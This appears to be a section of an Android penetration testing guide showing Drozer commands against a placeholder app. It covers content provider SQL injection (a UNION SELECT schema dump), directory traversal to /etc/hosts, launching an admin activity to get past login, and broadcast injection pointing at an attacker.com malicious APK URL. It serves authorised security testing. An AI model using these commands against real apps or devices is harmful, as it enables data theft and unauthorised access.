## Phase 4.5: Drozer — Android Component Security Testing

Drozer automates dynamic interaction with exported Android components (Activities,
Content Providers, Broadcast Receivers). Use it immediately after the manifest
checklist identifies exported components — it proves exploitability in minutes
without writing a full custom PoC APK, and often surfaces SQL injection and
directory traversal in Content Providers that static analysis misses.

```bash
# Setup: install agent APK on device/emulator, then connect via ADB forward
adb install drozer-agent.apk
adb forward tcp:31415 tcp:31415
drozer console connect

# Enumerate exported attack surface
dz> run app.package.attacksurface com.example.app
# → 3 activities exported, 2 content providers exported, 1 broadcast receivers exported
```

### Content Provider Data Extraction & SQL Injection

```bash
# Enumerate all content provider URIs
dz> run app.provider.finduri com.example.app
#   content://com.example.provider/users
#   content://com.example.provider/messages

# Query provider without any permission (when exported with no readPermission)
dz> run app.provider.query content://com.example.provider/users

# SQL injection probe via UNION SELECT — dumps schema
dz> run app.provider.query content://com.example.provider/users \
    --selection "1=1) UNION SELECT name,sql,null FROM sqlite_master--"

# Automated SQL injection scanner across all providers
dz> run scanner.provider.injection -a com.example.app

# Directory traversal via file-backed provider
dz> run app.provider.read content://com.example.provider/../../../../etc/hosts
```

### Activity Launch & Intent Injection

```bash
# Launch exported activity directly (bypass login / authentication screen)
dz> run app.activity.start \
    --component com.example.app com.example.app.AdminActivity

# Deep link activity with crafted extras (open redirect, XSS probe)
dz> run app.activity.start \
    --component com.example.app com.example.app.DeepLinkActivity \
    --extra string url "https://attacker.com"

# Broadcast injection to exported receiver
dz> run app.broadcast.send \
    --component com.example.app com.example.app.UpdateReceiver \
    --extra string update_url "https://attacker.com/malicious.apk"
```

---

